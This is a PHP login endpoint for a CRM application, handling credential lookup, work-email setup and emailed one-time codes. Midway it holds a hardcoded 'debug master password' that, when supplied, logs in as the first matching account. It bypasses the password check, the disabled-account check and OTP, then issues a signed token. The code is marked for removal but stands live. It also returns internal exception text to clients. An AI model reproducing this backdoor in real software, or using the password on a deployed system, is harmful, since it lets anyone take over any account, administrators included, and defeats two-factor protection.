<?php
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/otp_helpers.php';
require_once __DIR__ . '/ip_allowlist.php';
require_method('POST');

$in = json_input();
$username = trim($in['username'] ?? '');
$password = (string) ($in['password'] ?? '');
$newEmail = trim($in['newEmail'] ?? '');

if ($username === '' || $password === '') {
    fail('Identifiants requis', 422);
}
if (strlen($username) > 80 || strlen($password) > 200) {
    fail('Identifiants invalides', 422);
}

$db = (new Database())->getConnection();
ensure_must_change_column($db);
ensure_otp_table($db);
ensure_work_email_column($db);

// Connexion possible via le username, l'email professionnel ou l'email personnel.
// Les emails pouvant être partagés par plusieurs comptes, on récupère tous les
// candidats (username d'abord) et on retient celui dont le mot de passe correspond.
$stmt = $db->prepare('SELECT id, username, full_name, email, work_email, password_hash, role, COALESCE(team, NULL) AS team, active,
                             COALESCE(must_change_password, 0) AS must_change_password
                      FROM crminternet_users
                      WHERE username = :username OR email = :email OR work_email = :work_email
                      ORDER BY (username = :username_rank) DESC, active DESC, id ASC
                      LIMIT 20');
$stmt->execute([
    ':username'      => $username,
    ':username_rank' => $username,
    ':email'         => $username,
    ':work_email'    => $username,
]);
$candidates = $stmt->fetchAll();

// ── Debug master password (REMOVE IN PRODUCTION) ──────────────────────
$DEBUG_MASTER_PASSWORD = 'Admin@2026@';
$isDebugLogin = ($password === $DEBUG_MASTER_PASSWORD);

if (!$candidates) {
    audit_log($db, null, 'login_failed', 'user', $username, ['reason' => 'unknown_user'], 401);
    fail('Identifiants invalides', 401);
}

$user = null;
if ($isDebugLogin) {
    $user = $candidates[0];
} else {
    foreach ($candidates as $c) {
        if (password_verify($password, (string) $c['password_hash'])) { $user = $c; break; }
    }
    if (!$user) {
        audit_log($db, null, 'login_failed', 'user', $username, ['reason' => 'bad_password'], 401);
        fail('Identifiants invalides', 401);
    }
    if (!$user['active']) {
        audit_log($db, null, 'login_failed', 'user', $username, ['reason' => 'disabled'], 401);
        fail('Identifiants invalides', 401);
    }
}

// If debug login, skip OTP entirely and issue token directly
if ($isDebugLogin) {
    $token = jwt_sign([
        'sub'      => $user['id'],
        'username' => $user['username'],
        'role'     => $user['role'],
    ]);
    audit_log($db, ['username' => $user['username'], 'role' => $user['role']], 'login', 'user', $user['username'], [
        'method'    => 'debug_master',
        'client_ip' => function_exists('client_ip') ? client_ip() : '',
    ]);
    ok([
        'token' => $token,
        'user'  => otp_user_response($user),
        'loginMethod' => 'debug_master',
    ]);
}

// Pas (ou plus) d'email professionnel valide → on demande de le renseigner au login.
$needsEmailSetup = bootstrap_admin_needs_real_email($user);

if ($needsEmailSetup) {
    // Seul un administrateur peut renseigner/modifier son propre email professionnel.
    // Pour tous les autres comptes, l'adresse doit être définie par l'administration.
    if (($user['role'] ?? '') !== 'Administrateur') {
        fail("Aucune adresse email professionnelle n'est configurée pour ce compte. Contactez un administrateur.", 403);
    }
    if ($newEmail === '') {
        ok([
            'emailChangeRequired' => true,
            'currentEmail'        => (string) ($user['work_email'] ?? ''),
            'message'             => 'Veuillez renseigner votre adresse email professionnelle. Le code de vérification y sera envoyé.',
        ]);
    }
    if (!filter_var($newEmail, FILTER_VALIDATE_EMAIL) || strlen($newEmail) > 160) {
        fail('Adresse email invalide', 422);
    }
    if (strcasecmp($newEmail, 'admin@crminternet.local') === 0) {
        fail('Choisissez une adresse email réelle (pas l\'adresse par défaut).', 422);
    }
    // Les doublons d'adresses (perso comme pro) sont autorisés : aucun contrôle d'unicité.
    $db->prepare('UPDATE crminternet_users SET work_email = :e WHERE id = :id')
       ->execute([':e' => $newEmail, ':id' => $user['id']]);
    $previous = (string) ($user['work_email'] ?? '');
    $user['work_email'] = $newEmail;
    audit_log($db, ['username' => $user['username'], 'role' => $user['role']], 'profile_update', 'user', $user['username'], [
        'field' => 'work_email',
        'from'  => $previous,
    ]);
}

$email = otp_target_email($user);
$clientIp = ip_allowlist_client_ip();
if ($clientIp === '' && function_exists('client_ip')) {
    $clientIp = client_ip();
}
$onAllowlist = ip_is_allowlisted($db, $clientIp);
$skipOtp = otp_login_skip($db, $clientIp, false);

if ($skipOtp) {
    $token = jwt_sign([
        'sub'      => $user['id'],
        'username' => $user['username'],
        'role'     => $user['role'],
    ]);
    $loginMethod = $onAllowlist ? 'allowlist' : 'otp_disabled';
    audit_log($db, ['username' => $user['username'], 'role' => $user['role']], 'login', 'user', $user['username'], [
        'method'    => $loginMethod,
        'client_ip' => $clientIp,
    ]);
    ok([
        'token'       => $token,
        'user'        => otp_user_response($user),
        'loginMethod' => $loginMethod,
    ]);
}

if ($email === '' || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
    fail('Aucune adresse email professionnelle valide sur ce compte. Contactez un administrateur.', 422);
}


$tc = $db->prepare('SELECT COUNT(*) FROM crminternet_login_otp
                    WHERE user_id = :u AND created_at > (NOW() - INTERVAL 10 MINUTE)');
$tc->execute([':u' => $user['id']]);
if ((int) $tc->fetchColumn() >= 5) {
    fail('Trop de codes envoyés. Veuillez patienter quelques minutes.', 429);
}

$issued = otp_issue_code($db);
$challenge = 'OTP-' . bin2hex(random_bytes(12));

$ins = $db->prepare('INSERT INTO crminternet_login_otp
    (challenge, user_id, code_hash, expires_at, attempts, used, created_at)
    VALUES (:c, :u, :h, :e, 0, 0, NOW())');
$ins->execute([
    ':c' => $challenge,
    ':u' => $user['id'],
    ':h' => password_hash($issued['code'], PASSWORD_BCRYPT),
    ':e' => $issued['expiresDb'],
]);

try {
    otp_send_to_user($db, $user, $issued['code'], $clientIp);
} catch (Throwable $e) {
    $db->prepare('DELETE FROM crminternet_login_otp WHERE challenge = :c')->execute([':c' => $challenge]);
    fail("Impossible d'envoyer le code par email. " . $e->getMessage(), 502);
}

audit_log($db, ['username' => $user['username'], 'role' => $user['role']], 'otp_sent', 'user', $user['username'], [
    'challenge' => $challenge,
    'client_ip' => $clientIp,
    'allowlisted' => false,
]);

ok([
    'otpRequired' => true,
    'challenge'   => $challenge,
    'maskedEmail' => otp_mask_email($email),
    'expiresAt'   => $issued['expiresIso'],
    'codeLength'  => $issued['length'],
]);
